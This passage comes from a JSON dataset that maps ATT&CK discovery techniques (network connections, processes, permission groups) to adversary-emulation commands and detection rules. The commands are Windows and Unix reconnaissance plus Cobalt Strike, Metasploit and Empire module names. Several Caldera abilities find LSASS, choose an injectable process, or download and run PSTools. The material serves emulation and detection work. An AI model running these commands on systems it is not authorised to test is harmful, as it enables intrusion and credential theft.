Network Connections": {"id": "638fb6bb-ba39-4285-93d1-7e4775b033a8", "name": "Find System Network Connections", "description": "Find System Network Connections", "tactic": "discovery", "technique": {"attack_id": "T1049", "name": "System Network Connections Discovery"}, "platforms": {"darwin": {"sh": {"command": "netstat -ant\n"}}, "linux": {"sh": {"command": "netstat -ant\n"}}, "windows": {"psh": {"command": "Get-NetTCPConnection\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/monitortcpconnections", "ATT&CK Technique #1": "T1049", "ATT&CK Technique #2": "", "Technique": "System Network Connections Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/monitortcpconnections\":  [\"T1049\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_rdp_session", "ATT&CK Technique #1": "T1049", "ATT&CK Technique #2": "", "Technique": "System Network Connections Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_rdp_session\":  [\"T1049\"],"}}], "command_list": ["netstat -ano[b] ", "shell c:\\windows\\sysnative\\netstat.exe -ano[b]", "post/windows/gather/tcpnetstat", "net session | find / \"\\\\\"", "shell net session | find / \"\\\\\"", "post/windows/gather/enum_logged_on_users", "netstat\nnet use\nnet sessions\n", "Get-NetTCPConnection\n", "netstat\nwho -a\n", {"windows": {"psh": {"command": "netstat -ano;\nGet-NetTCPConnection"}}}, {"darwin": {"sh": {"command": "netstat -ant\n"}}, "linux": {"sh": {"command": "netstat -ant\n"}}, "windows": {"psh": {"command": "Get-NetTCPConnection\n"}}}, "powershell/situational_awareness/host/monitortcpconnections", "powershell/situational_awareness/host/monitortcpconnections", "powershell/situational_awareness/network/powerview/get_rdp_session", "powershell/situational_awareness/network/powerview/get_rdp_session", "Dos\nC: \\ Users \\ Administrator> netstat\n\nActive connections\n\nProtocol local address external address status", "Dos\nC: \\ Users \\ Administrator> net use\nIt will record a new network connection.\n\nList is empty.", "Dos\nC: \\ Users \\ Administrator> net session\nList is empty."], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"netstat.exe\")and (process_command_line contains \"*net* use*\"or process_command_line contains \"*net* sessions*\"or process_command_line contains \"*net* file*\"or process_command_line contains \"*netstat*\")or process_command_line contains \"*Get-NetTCPConnection*\"", "name": "System Network Connections Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system network link found\ndescription: windows server 2016\nreferences:\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ NETSTAT.EXE' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: netstat # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # a user's privileges to be adjusted.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ NETSTAT.EXE' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EnabledPrivileges: 'SeDebugPrivilege' permission enabled #\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ NETSTAT.EXE' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system network link found\ndescription: windows server 2016\nreferences:\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net use # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system network link found\ndescription: windows server 2016\nreferences:\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net session # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 session # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1057", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "tasklist /v [/svc]\nnet start\nqprocess *", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ps\nshell tasklist /v [/svc]\nshell net start", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ps\npost/windows/gather/enum_services", "name": "Metasploit"}, {"source": "atomics/T1057/T1057.yaml", "command": "ps >> /tmp/loot.txt\nps aux >> /tmp/loot.txt\n", "name": null}, {"source": "atomics/T1057/T1057.yaml", "command": "tasklist\n", "name": null}, {"source": "data/abilities/collection/8adf02e8-6e71-4244-886c-98c402857404.yml", "command": {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"}}}, "name": "Capture running processes and their loaded DLLs"}, {"source": "data/abilities/collection/cc191baa-7472-4386-a2f4-42f203f1acfd.yml", "command": {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}, "name": "Process discovery via SysInternals pstool"}, {"source": "data/abilities/discovery/0093c0e0-68b6-4cab-b0d4-2b40b3c78f71.yml", "command": {"linux": {"sh": {"command": "acrnctl list\n", "parsers": {"plugins.stockpile.app.parsers.acrn": [{"source": "hypervisor.vm.name"}]}}}}, "name": "Enumerate running virtual machines on hypervisor"}, {"source": "data/abilities/discovery/05cda6f6-2b1b-462e-bff1-845af94343f7.yml", "command": {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}}}}, "name": "Discovers processes that the current user has the ability to access and selects an injectable one"}, {"source": "data/abilities/discovery/0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7.yml", "command": {"windows": {"psh": {"command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}}, "cmd": {"build_target": "GetLsass.exe", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabLsassProcess()\n        {\n            Process[] allProc = Process.GetProcessesByName(\"lsass\");\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabLsassProcess();\n        }\n    }\n}\n"}}}, "name": "Get process info for LSASS"}, {"source": "data/abilities/discovery/3b5db901-2cb8-4df7-8043-c4628a6a5d5a.yml", "command": {"darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}}, "name": "Get process info for processes running as a user"}, {"source": "data/abilities/discovery/5a39d7ed-45c9-4a79-b581-e5fb99e24f65.yml", "command": {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}, "donut_amd64": {"build_target": "ProcessDump.donut", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}, "name": "Identify system processes"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/paranoia", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/paranoia", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/process_hunter", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/process_hunter", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1057", "Built-in Windows Command": "tasklist /v [/svc]\nnet start\nqprocess *", "Cobalt Strike": "ps\nshell tasklist /v [/svc]\nshell net start", "Metasploit": "ps\npost/windows/gather/enum_services", "Description": "Display list of currently running processes and services on the system"}}, {"Atomic Red Team Test - Process Discovery": {"attack_technique": "T1057", "display_name": "Process Discovery", "atomic_tests": [{"name": "Process Discovery - ps", "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt. \n", "supported_platforms": ["macos", "linux"], "input_arguments": {"output_file": {"description": "path of output file", "type": "path", "default": "/tmp/loot.txt"}}, "executor": {"name": "sh", "elevation_required": false, "command": "ps >> #{output_file}\nps aux >> #{output_file}\n"}}, {"name": "Process Discovery - tasklist", "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "tasklist\n"}}]}}, {"Mitre Stockpile - Capture running processes and their loaded DLLs": {"id": "8adf02e8-6e71-4244-886c-98c402857404", "name": "tasklist Process Enumeration", "description": "Capture running processes and their loaded DLLs", "tactic": "collection", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"}}}}}, {"Mitre Stockpile - Process discovery via SysInternals pstool": {"id": "cc191baa-7472-4386-a2f4-42f203f1acfd", "name": "SysInternals PSTool Process Discovery", "description": "Process discovery via SysInternals pstool", "tactic": "collection", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}}}, {"Mitre Stockpile - Enumerate running virtual machines on hypervisor": {"id": "0093c0e0-68b6-4cab-b0d4-2b40b3c78f71", "name": "enumerate VMs", "description": "Enumerate running virtual machines on hypervisor", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"linux": {"sh": {"command": "acrnctl list\n", "parsers": {"plugins.stockpile.app.parsers.acrn": [{"source": "hypervisor.vm.name"}]}}}}}}, {"Mitre Stockpile - Discovers processes that the current user has the ability to access and selects an injectable one": {"id": "05cda6f6-2b1b-462e-bff1-845af94343f7", "name": "Discover injectable process", "description": "Discovers processes that the current user has the ability to access and selects an injectable one", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}}}}}}, {"Mitre Stockpile - Get process info for LSASS": {"id": "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7", "name": "Find LSASS", "description": "Get process info for LSASS", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}}, "cmd": {"build_target": "GetLsass.exe", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabLsassProcess()\n        {\n            Process[] allProc = Process.GetProcessesByName(\"lsass\");\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabLsassProcess();\n        }\n    }\n}\n"}}}}}, {"Mitre Stockpile - Get process info for processes running as a user": {"id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "name": "Find user processes", "description": "Get process info for processes running as a user", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}, {"Mitre Stockpile - Identify system processes": {"id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65", "name": "System processes", "description": "Identify system processes", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}, "donut_amd64": {"build_target": "ProcessDump.donut", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/paranoia", "ATT&CK Technique #1": "T1057", "ATT&CK Technique #2": "", "Technique": "Process Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/paranoia\":  [\"T1057\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/process_hunter", "ATT&CK Technique #1": "T1057", "ATT&CK Technique #2": "", "Technique": "Process Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/process_hunter\":  [\"T1057\"],"}}], "command_list": ["tasklist /v [/svc]\nnet start\nqprocess *", "ps\nshell tasklist /v [/svc]\nshell net start", "ps\npost/windows/gather/enum_services", "ps >> /tmp/loot.txt\nps aux >> /tmp/loot.txt\n", "tasklist\n", {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"}}}, {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}, {"linux": {"sh": {"command": "acrnctl list\n", "parsers": {"plugins.stockpile.app.parsers.acrn": [{"source": "hypervisor.vm.name"}]}}}}, {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}}}}, {"windows": {"psh": {"command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "json_key": "Id", "json_type": ["int"]}]}}, "cmd": {"build_target": "GetLsass.exe", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabLsassProcess()\n        {\n            Process[] allProc = Process.GetProcessesByName(\"lsass\");\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabLsassProcess();\n        }\n    }\n}\n"}}}, {"darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}}, {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}, "donut_amd64": {"build_target": "ProcessDump.donut", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}, "powershell/situational_awareness/host/paranoia", "powershell/situational_awareness/host/paranoia", "powershell/situational_awareness/network/powerview/process_hunter", "powershell/situational_awareness/network/powerview/process_hunter"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_path contains \"tasklist.exe\"or process_command_line contains \"Get-Process\"", "name": "Process Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows executed locally Tasklist\ndescription: windows server 2016\nreferences: No\ntags: T1057\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ system32 \\ tasklist.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: tasklist # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1069", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net localgroup \"Administrators\"", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net localgroup \"Administrators\"", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/local_admin_search_enum", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group [\"Domain Admins\"] /domain[:DOMAIN] ", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group [\"Domain Admins\"] /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "domain_list_gen.rb\npost/windows/gather/enum_domain_group_users", "name": "Metasploit"}, {"source": "atomics/T1069/T1069.yaml", "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\n", "name": null}, {"source": "atomics/T1069/T1069.yaml", "command": "net localgroup\nnet group /domain\nnet group \"domain admins\" /domain\n", "name": null}, {"source": "atomics/T1069/T1069.yaml", "command": "get-localgroup\nget-ADPrincipalGroupMembership administrator | select name\n", "name": null}, {"source": "atomics/T1069/T1069.yaml", "command": "net group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n", "name": null}, {"source": "data/abilities/discovery/5c4dd985-89e3-4590-9b57-71fed66ff4e2.yml", "command": {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}, "name": "Summary of permission and security groups"}, {"source": "data/abilities/discovery/feaced8f-f43f-452a-9500-a5219488abb8.yml", "command": {"darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}, "windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}}, "name": "Identify all local users"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_pathacl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_pathacl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_object_acl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_object_acl", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/map_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/map_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_uaclevel", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_uaclevel", "name": "Empire Module Command"}], 